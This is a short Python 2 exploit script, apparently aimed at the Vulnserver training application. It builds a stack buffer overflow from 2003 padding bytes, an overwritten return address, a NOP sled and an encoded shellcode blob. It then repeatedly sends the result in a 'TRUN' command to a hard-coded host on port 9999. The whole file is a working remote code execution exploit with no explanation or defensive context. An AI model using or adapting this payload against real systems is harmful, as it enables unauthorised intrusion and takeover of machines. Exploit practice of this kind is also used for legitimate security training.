#!/usr/bin/python
import sys, socket

overflow = (
"\xb8\x5c\xb1\x52\x3e\xdb\xdd\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x83\xc5\x04\x31\x45\x0e\x03\x19\xbf\xb0\xcb\x5d\x57\xb6"
"\x34\x9d\xa8\xd7\xbd\x78\x99\xd7\xda\x09\x8a\xe7\xa9\x5f\x27"
"\x83\xfc\x4b\xbc\xe1\x28\x7c\x75\x4f\x0f\xb3\x86\xfc\x73\xd2"
"\x04\xff\xa7\x34\x34\x30\xba\x35\x71\x2d\x37\x67\x2a\x39\xea"
"\x97\x5f\x77\x37\x1c\x13\x99\x3f\xc1\xe4\x98\x6e\x54\x7e\xc3"
"\xb0\x57\x53\x7f\xf9\x4f\xb0\xba\xb3\xe4\x02\x30\x42\x2c\x5b"
"\xb9\xe9\x11\x53\x48\xf3\x56\x54\xb3\x86\xae\xa6\x4e\x91\x75"
"\xd4\x94\x14\x6d\x7e\x5e\x8e\x49\x7e\xb3\x49\x1a\x8c\x78\x1d"
"\x44\x91\x7f\xf2\xff\xad\xf4\xf5\x2f\x24\x4e\xd2\xeb\x6c\x14"
"\x7b\xaa\xc8\xfb\x84\xac\xb2\xa4\x20\xa7\x5f\xb0\x58\xea\x37"
"\x75\x51\x14\xc8\x11\xe2\x67\xfa\xbe\x58\xef\xb6\x37\x47\xe8"
"\xb9\x6d\x3f\x66\x44\x8e\x40\xaf\x83\xda\x10\xc7\x22\x63\xfb"
"\x17\xca\xb6\xac\x47\x64\x69\x0d\x37\xc4\xd9\xe5\x5d\xcb\x06"
"\x15\x5e\x01\x2f\xbc\xa5\xc2\x90\xe9\x26\x93\x79\xe8\x28\x85"
"\x25\x65\xce\xcf\xc5\x23\x59\x78\x7f\x6e\x11\x19\x80\xa4\x5c"
"\x19\x0a\x4b\xa1\xd4\xfb\x26\xb1\x81\x0b\x7d\xeb\x04\x13\xab"
"\x83\xcb\x86\x30\x53\x85\xba\xee\x04\xc2\x0d\xe7\xc0\xfe\x34"
"\x51\xf6\x02\xa0\x9a\xb2\xd8\x11\x24\x3b\xac\x2e\x02\x2b\x68"
"\xae\x0e\x1f\x24\xf9\xd8\xc9\x82\x53\xab\xa3\x5c\x0f\x65\x23"
"\x18\x63\xb6\x35\x25\xae\x40\xd9\x94\x07\x15\xe6\x19\xc0\x91"
"\x9f\x47\x70\x5d\x4a\xcc\x90\xbc\x5e\x39\x39\x19\x0b\x80\x24"
"\x9a\xe6\xc7\x50\x19\x02\xb8\xa6\x01\x67\xbd\xe3\x85\x94\xcf"
"\x7c\x60\x9a\x7c\x7c\xa1")


shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

while True:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.131.1', 9999))
		
		s.send(('TRUN /.:/' + shellcode))
		s.close()
	except:
		print "Error connecting to server"
		sys.exit()
